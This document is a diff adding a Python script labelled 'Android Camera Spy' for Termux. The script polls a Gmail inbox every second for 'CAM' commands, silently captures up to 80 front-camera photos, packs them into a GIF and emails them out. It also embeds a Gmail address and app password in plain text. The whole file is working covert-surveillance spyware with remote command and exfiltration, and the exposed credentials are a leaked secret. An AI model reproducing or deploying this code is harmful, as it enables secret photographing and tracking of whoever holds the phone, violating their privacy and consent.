@@ -1,0 +1,570 @@
+#!/usr/bin/env python3
+"""
+ANDROID CAMERA SPY - COMMAND MODE
+Checks for NEW email commands "CAMX" every second
+CAMX where X = number of photos (1-80)
+Only responds to newly arrived emails with "CAM" in body
+"""
+
+import subprocess, time, smtplib, os, sys, imaplib, email, re
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+from email.header import decode_header
+
+SENDER_EMAIL = "shark551151@gmail.com"
+SENDER_PASSWORD = "nkjr lvac luli rscz"
+RECEIVER_EMAIL = "shark551151@gmail.com"
+COMMAND_PREFIX = "CAM"
+
+# Track the last processed email ID
+last_email_id = None
+
+def log(msg):
+    print(f"[{time.strftime('%H:%M:%S')}] {msg}")
+
+def install_requirements():
+    """Install required packages"""
+    log("Checking requirements...")
+    
+    try:
+        result = subprocess.run(
+            ["termux-camera-photo", "-h"],
+            capture_output=True,
+            timeout=3
+        )
+        log("termux-api package found")
+        return True
+    except FileNotFoundError:
+        log("Installing termux-api...")
+        try:
+            subprocess.run(["pkg", "install", "-y", "termux-api"], timeout=60, check=True)
+            log("Installed termux-api")
+            return True
+        except:
+            log("Failed to install termux-api")
+            return False
+    except Exception as e:
+        log(f"Check failed: {e}")
+        return True
+
+def test_camera():
+    """Test if camera works"""
+    log("Testing camera...")
+    
+    temp_file = f"/data/data/com.termux/files/usr/tmp/test_{int(time.time())}.jpg"
+    
+    try:
+        # Test front camera (camera 1)
+        result = subprocess.run(
+            ["termux-camera-photo", "-c", "1", temp_file],
+            timeout=8,
+            capture_output=True,
+            text=True
+        )
+        
+        time.sleep(1)
+        
+        if os.path.exists(temp_file):
+            size = os.path.getsize(temp_file)
+            os.remove(temp_file)
+            
+            if size > 5000:
+                log(f"Front camera works! ({size//1024}KB)")
+                return True
+            else:
+                log(f"Photo too small ({size} bytes)")
+                return False
+        else:
+            log("Photo not created")
+            if result.stderr:
+                log(f"   Error: {result.stderr.strip()}")
+            return False
+            
+    except subprocess.TimeoutExpired:
+        log("Camera timeout - permission not granted?")
+        return False
+    except Exception as e:
+        log(f"Camera test failed: {e}")
+        return False
+
+def capture_photo_to_memory():
+    """Capture front camera photo and read to memory"""
+    temp_file = f"/data/data/com.termux/files/usr/tmp/cam_{int(time.time())}.jpg"
+    
+    try:
+        # Use front camera (camera 1)
+        result = subprocess.run(
+            ["termux-camera-photo", "-c", "1", temp_file],
+            timeout=8,
+            capture_output=True
+        )
+        
+        time.sleep(0.5)
+        
+        # Read to memory
+        if os.path.exists(temp_file) and os.path.getsize(temp_file) > 5000:
+            with open(temp_file, 'rb') as f:
+                data = f.read()
+            os.remove(temp_file)
+            return data
+        else:
+            if os.path.exists(temp_file):
+                os.remove(temp_file)
+            return None
+            
+    except Exception as e:
+        if os.path.exists(temp_file):
+            os.remove(temp_file)
+        return None
+
+def create_gif_from_photos(num_photos, interval=1.2):
+    """Capture multiple photos and create optimized small GIF in memory"""
+    log(f"Capturing {num_photos} photos from front camera...")
+    
+    # Import PIL
+    try:
+        from PIL import Image
+        import io
+    except ImportError:
+        log("Installing Pillow...")
+        subprocess.run([sys.executable, "-m", "pip", "install", "-q", "pillow"], timeout=60)
+        from PIL import Image
+        import io
+    
+    photos = []
+    failed = 0
+    
+    for i in range(num_photos):
+        photo_data = capture_photo_to_memory()
+        
+        if photo_data:
+            try:
+                img = Image.open(io.BytesIO(photo_data))
+                
+                # Aggressive resize to keep GIF small (1/4 of original)
+                new_size = (img.width // 4, img.height // 4)
+                img = img.resize(new_size, Image.Resampling.LANCZOS)
+                
+                # Convert to RGB
+                if img.mode != 'RGB':
+                    img = img.convert('RGB')
+                
+                # Reduce colors to 128 for smaller file size
+                img = img.convert('P', palette=Image.ADAPTIVE, colors=128)
+                
+                photos.append(img)
+                
+                if (i + 1) % 10 == 0 or (i + 1) == num_photos:
+                    log(f"  Progress: {i+1}/{num_photos}")
+            except Exception as e:
+                log(f"Photo {i} error: {e}")
+                failed += 1
+        else:
+            failed += 1
+        
+        if failed > 10:
+            log("Too many failures")
+            break
+        
+        time.sleep(interval)
+    
+    log(f"Got {len(photos)} photos (failed: {failed})")
+    
+    if len(photos) < 5:  # Reduced minimum for low photo counts
+        log("Not enough photos for GIF")
+        return None
+    
+    # Create optimized GIF in memory
+    log("Creating optimized GIF in memory...")
+    try:
+        gif_buffer = io.BytesIO()
+        photos[0].save(
+            gif_buffer,
+            format='GIF',
+            save_all=True,
+            append_images=photos[1:],
+            duration=800,  # 800ms per frame
+            loop=0,
+            optimize=True,
+            quality=50  # Reduce quality for smaller size
+        )
+        gif_data = gif_buffer.getvalue()
+        size_kb = len(gif_data) // 1024
+        size_mb = size_kb / 1024
+        
+        log(f"GIF created: {size_kb}KB ({size_mb:.2f}MB)")
+        
+        # Clear photos from memory
+        photos.clear()
+        
+        return gif_data if size_kb > 5 else None  # Reduced minimum size
+    except Exception as e:
+        log(f"GIF creation failed: {e}")
+        return None
+
+def parse_command_number(body):
+    """Extract number from CAM command (CAM1, CAM80, etc.)"""
+    if not body:
+        return 80  # Default
+    
+    body_upper = body.upper()
+    
+    # Look for CAM followed by digits
+    pattern = r'CAM(\d+)'
+    match = re.search(pattern, body_upper)
+    
+    if match:
+        try:
+            num = int(match.group(1))
+            # Limit between 1 and 80
+            if num < 1:
+                return 1
+            elif num > 80:
+                return 80
+            else:
+                return num
+        except:
+            return 80  # Default if parsing fails
+    else:
+        # Check if just "CAM" without number
+        if "CAM" in body_upper:
+            return 80  # Default
+        else:
+            return None  # Not a CAM command
+
+def test_email_login():
+    """Test Gmail login"""
+    log("Testing Gmail login...")
+    
+    try:
+        # Test SMTP for sending
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(SENDER_EMAIL, SENDER_PASSWORD)
+        server.quit()
+        log("Gmail SMTP (sending) OK!")
+        
+        # Test IMAP for receiving
+        mail = imaplib.IMAP4_SSL('imap.gmail.com')
+        mail.login(SENDER_EMAIL, SENDER_PASSWORD)
+        mail.logout()
+        log("Gmail IMAP (receiving) OK!")
+        
+        return True
+        
+    except smtplib.SMTPAuthenticationError as e:
+        log(f"AUTHENTICATION FAILED!")
+        log(f"   Error: {e}")
+        return False
+    except Exception as e:
+        log(f"Connection error: {e}")
+        return False
+
+def send_email(data, cycle_num, command_id=None, num_photos=80):
+    """Send GIF via email"""
+    size_kb = len(data) // 1024
+    size_mb = size_kb / 1024
+    
+    if command_id:
+        subject = f"CAM{num_photos} RESPONSE #{cycle_num} | {time.strftime('%d/%m %H:%M')} | {size_kb}KB"
+    else:
+        subject = f"Cam Spy #{cycle_num} | {time.strftime('%d/%m %H:%M')} | {size_kb}KB"
+    
+    log(f"Sending email #{cycle_num}...")
+    log(f"   GIF size: {size_kb}KB ({size_mb:.2f}MB)")
+    
+    try:
+        msg = MIMEMultipart()
+        msg['From'] = SENDER_EMAIL
+        msg['To'] = RECEIVER_EMAIL
+        msg['Subject'] = subject
+        
+        part = MIMEBase('image', 'gif')
+        part.set_payload(data)
+        encoders.encode_base64(part)
+        
+        if command_id:
+            filename = f"cam{num_photos}_response_{command_id}_{cycle_num}.gif"
+        else:
+            filename = f"spy{cycle_num}.gif"
+        
+        part.add_header('Content-Disposition', f'attachment; filename="{filename}"')
+        msg.attach(part)
+        
+        log("Connecting to Gmail server...")
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        
+        log("Logging in...")
+        server.login(SENDER_EMAIL, SENDER_PASSWORD)
+        
+        log("Sending email...")
+        text = msg.as_string()
+        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, text)
+        server.quit()
+        
+        log("EMAIL SENT SUCCESSFULLY!")
+        return True
+        
+    except Exception as e:
+        log(f"Email error: {e}")
+        return False
+
+def get_newest_email_id():
+    """Get the ID of the newest email in inbox"""
+    try:
+        # Connect to Gmail IMAP server
+        mail = imaplib.IMAP4_SSL('imap.gmail.com')
+        mail.login(SENDER_EMAIL, SENDER_PASSWORD)
+        
+        # Select inbox
+        mail.select('inbox')
+        
+        # Search for ALL emails and get the newest one
+        status, messages = mail.search(None, 'ALL')
+        
+        if status != 'OK' or not messages[0]:
+            mail.logout()
+            return None
+        
+        email_ids = messages[0].split()
+        
+        # Get the newest email ID (last in list)
+        if email_ids:
+            newest_id = email_ids[-1].decode()
+            mail.logout()
+            return newest_id
+        else:
+            mail.logout()
+            return None
+            
+    except Exception as e:
+        log(f"Error getting newest email ID: {e}")
+        return None
+
+def check_for_new_command():
+    """Check only NEWEST email for CAM command"""
+    global last_email_id
+    
+    try:
+        # Get current newest email ID
+        current_newest_id = get_newest_email_id()
+        
+        if not current_newest_id:
+            return None, None
+        
+        # If no email has been processed yet, set initial state
+        if last_email_id is None:
+            last_email_id = current_newest_id
+            log(f"Initial email ID set: {last_email_id}")
+            return None, None
+        
+        # Check if a new email arrived
+        if current_newest_id != last_email_id:
+            log(f"New email detected! ID: {current_newest_id} (Previous: {last_email_id})")
+            
+            # Connect to read the new email
+            mail = imaplib.IMAP4_SSL('imap.gmail.com')
+            mail.login(SENDER_EMAIL, SENDER_PASSWORD)
+            mail.select('inbox')
+            
+            # Fetch the new email
+            status, msg_data = mail.fetch(current_newest_id.encode(), '(RFC822)')
+            
+            if status == 'OK':
+                raw_email = msg_data[0][1]
+                email_message = email.message_from_bytes(raw_email)
+                
+                # Get sender
+                sender = email_message['From']
+                
+                # Get subject
+                subject = ""
+                if email_message['Subject']:
+                    subject_part, encoding = decode_header(email_message['Subject'])[0]
+                    if isinstance(subject_part, bytes):
+                        subject = subject_part.decode(encoding if encoding else 'utf-8')
+                    else:
+                        subject = str(subject_part)
+                
+                # Get email body
+                body = ""
+                if email_message.is_multipart():
+                    for part in email_message.walk():
+                        content_type = part.get_content_type()
+                        content_disposition = str(part.get("Content-Disposition"))
+                        
+                        if content_type == "text/plain" and "attachment" not in content_disposition:
+                            body_bytes = part.get_payload(decode=True)
+                            if body_bytes:
+                                body = body_bytes.decode(errors='ignore')
+                            break
+                else:
+                    body_bytes = email_message.get_payload(decode=True)
+                    if body_bytes:
+                        body = body_bytes.decode(errors='ignore')
+                
+                # Check if body contains CAM command
+                num_photos = parse_command_number(body)
+                
+                if num_photos is not None:
+                    timestamp = int(time.time())
+                    command_id = f"{timestamp}_{current_newest_id}"
+                    log(f"NEW COMMAND RECEIVED! ID: {command_id}")
+                    log(f"   Command: CAM{num_photos}")
+                    log(f"   From: {sender}")
+                    log(f"   Subject: {subject}")
+                    log(f"   Body preview: {body[:30]}...")
+                    
+                    # Update last processed email ID
+                    last_email_id = current_newest_id
+                    
+                    # Mark as read
+                    mail.store(current_newest_id.encode(), '+FLAGS', '\\Seen')
+                    mail.logout()
+                    
+                    return command_id, num_photos
+                else:
+                    log(f"New email doesn't contain '{COMMAND_PREFIX}' command, ignoring...")
+                    # Still update last_email_id so we don't check it again
+                    last_email_id = current_newest_id
+                    mail.logout()
+                    return None, None
+            else:
+                mail.logout()
+                # Update anyway to prevent repeated checking
+                last_email_id = current_newest_id
+                return None, None
+        
+        # No new email
+        return None, None
+        
+    except Exception as e:
+        log(f"Error checking for new commands: {e}")
+        return None, None
+
+def execute_command_cycle(cycle_num, command_id, num_photos):
+    """Execute one camera cycle for a command"""
+    log("="*60)
+    log(f"EXECUTING COMMAND {command_id}")
+    log(f"CYCLE {cycle_num}")
+    log(f"CAPTURING {num_photos} PHOTOS")
+    log("="*60)
+    
+    # Capture specified number of photos from front camera
+    gif_data = create_gif_from_photos(num_photos=num_photos, interval=1.2)
+    
+    if gif_data:
+        if send_email(gif_data, cycle_num, command_id, num_photos):
+            log("COMMAND EXECUTED SUCCESSFULLY!")
+            # Clear memory
+            gif_data = None
+            return True
+        else:
+            log("Email failed")
+    else:
+        log("Capture failed")
+    
+    return False
+
+# ==================== MAIN ====================
+def main():
+    global last_email_id
+    
+    log("ANDROID CAMERA SPY - VARIABLE PHOTO COMMAND MODE")
+    log(f"{time.strftime('%Y-%m-%d %H:%M:%S')}")
+    log("="*60)
+    log("Monitoring for NEW emails with 'CAMX' command...")
+    log("X = Number of photos to capture (1-80)")
+    log("Examples: CAM1, CAM10, CAM80")
+    log(f"Default: CAM (without number) = 80 photos")
+    log(f"Monitoring: {SENDER_EMAIL}")
+    log("Polling frequency: EVERY SECOND")
+    log("Will ONLY respond to NEWLY arrived emails")
+    log("="*60)
+    
+    # Install requirements
+    if not install_requirements():
+        log("Cannot install requirements")
+        log("Try manually: pkg install termux-api")
+        return
+    
+    # Test camera
+    log("Testing front camera access...")
+    if not test_camera():
+        log("CAMERA NOT WORKING!")
+        log("FIX STEPS:")
+        log("1. Install 'Termux:API' app from Play Store or F-Droid")
+        log("2. Run: pkg install termux-api")
+        log("3. Grant CAMERA permission to Termux:API app")
+        log("4. Settings -> Apps -> Termux:API -> Permissions -> Camera -> Allow")
+        log("Then run this script again.")
+        return
+    
+    # Test email login
+    log("Testing email credentials...")
+    if not test_email_login():
+        log("EMAIL LOGIN FAILED!")
+        log("Fix your Gmail credentials in the script and try again.")
+        log("Make sure to use App Password, not your regular password.")
+        return
+    
+    # Initialize by getting current newest email ID
+    log("Initializing email monitoring...")
+    initial_id = get_newest_email_id()
+    if initial_id:
+        last_email_id = initial_id
+        log(f"Tracking emails from ID: {last_email_id}")
+        log("Old emails will be ignored, only NEW emails will be checked.")
+    else:
+        log("Could not get initial email state. Starting fresh.")
+        last_email_id = None
+    
+    log("="*60)
+    log("SYSTEM READY - MONITORING FOR NEW COMMANDS")
+    log("="*60)
+    log("Send a NEW email to: " + SENDER_EMAIL)
+    log("Email body must contain: 'CAM' followed by number (1-80)")
+    log("Examples: CAM1, CAM10, CAM80")
+    log("Uses FRONT camera")
+    log("Real-time response (1-second polling)")
+    log("Shows GIF size before sending")
+    log("NOW MONITORING FOR NEW EMAILS...")
+    
+    cycle = 0
+    success = 0
+    check_count = 0
+    
+    while True:
+        check_count += 1
+        
+        # Display status every 60 checks (every minute)
+        if check_count % 60 == 0:
+            minutes = check_count // 60
+            log(f"Monitoring for {minutes} minute(s)... Total checks: {check_count}")
+            log(f"Successful executions: {success}")
+        
+        # Check for NEW commands (newly arrived emails only)
+        command_id, num_photos = check_for_new_command()
+        
+        if command_id and num_photos:
+            cycle += 1
+            if execute_command_cycle(cycle, command_id, num_photos):
+                success += 1
+            
+            log(f"Total successful executions: {success}")
+            log("Returning to NEW email monitoring...")
+        
+        # Wait exactly 1 second before next check
+        time.sleep(1)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        log("Stopped by user")
+    except Exception as e:
+        log(f"Fatal error: {e}")
+        import traceback
+        traceback.print_exc()
